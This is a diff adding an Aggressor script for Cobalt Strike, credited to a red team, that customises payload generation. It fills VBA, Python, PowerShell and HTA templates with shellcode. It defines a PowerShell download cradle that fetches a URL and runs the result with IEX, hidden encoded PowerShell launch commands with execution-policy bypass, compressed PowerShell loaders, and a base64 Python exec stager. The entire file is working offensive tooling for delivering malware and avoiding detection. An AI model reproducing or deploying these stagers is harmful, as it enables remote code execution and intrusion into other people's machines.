@@ -1,0 +1,104 @@
+###############################################
+#  time: 2018.10.27
+#  author: L.N.@360A-Team(Red Team)
+###############################################
+
+set RESOURCE_GENERATOR {
+	local('$handle $data');
+
+	if (-exists script_resource($1)) {
+		return $null;
+	}
+
+	$handle = openf(script_resource($1));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	if ($1 eq "template.x86.vba") {
+		return strrep($data, '$PAYLOAD$', 'myArray = '. transform($2, "vba"));
+	}
+	else if ($1 eq "template.py") {
+		return strrep($data, '$$CODE32$$', transform($2, "veil"), '$$CODE64$$', transform($3, "veil"));
+	}
+	else if ($1 eq "template.x86.ps1") {
+		return strrep($data, '%%DATA%%', base64_encode($2));
+	}
+	else if ($1 eq "template.x64.ps1") {
+		return strrep($data, '%%DATA%%', base64_encode($3));
+	}
+
+	return $null;	
+}
+
+
+set HTMLAPP_EXE {
+	local('$handle $data $name $x @array');
+
+	$handle = openf(script_resource("htmlapp.txt"));
+	$data = readb($handle, -1);
+	closef($handle);
+	$name = "";
+	@array = @("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");
+
+	for ($x = 0; $x < 10; $x++)
+	{
+		$name = $name . rand(@array);
+	}
+
+	return strrep($data, '##EXE##', transform($1, "hex"), '##NAME##', $name.".exe");
+}
+
+
+set HTMLAPP_POWERSHELL {
+	local('$handle $data');
+
+	$handle = openf(script_resource("htmlapp2.txt"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	return strrep($data, '%%DATA%%', $1);
+}
+
+
+set RESOURCE_GENERATOR_VBS {
+	local('$handle $data');
+
+	$handle = openf(script_resource("template.vbs"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	return strrep($data, '$$CODE$$', transform_vbs($1, "3"));
+}
+
+
+set POWERSHELL_DOWNLOAD_CRADLE {
+	return "IEX (New-Object Net.Webclient).DownloadString('" . $1 . "')";
+}
+
+
+set POWERSHELL_COMMAND {
+	local('$script');
+
+	$script = base64_encode(str_encode($1, "UTF-16LE"));
+    if ($2) {
+        return "powershell -nop -w hidden -enCodedcommand " . $script;
+    }
+
+    return "powershell -nop -exec bypass -EnCodedCommand " . $script;
+}
+
+
+set POWERSHELL_COMPRESS {
+	local('$handle $data');
+
+	$handle = openf(script_resource("compress.ps1"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	return strrep($data, '%%DATA%%', base64_encode(gzip($1)));
+}
+
+
+set PYTHON_COMPRESS {
+	return "import base64; exec base64.b64decode(\"" . base64_encode($1) . "\")";
+}
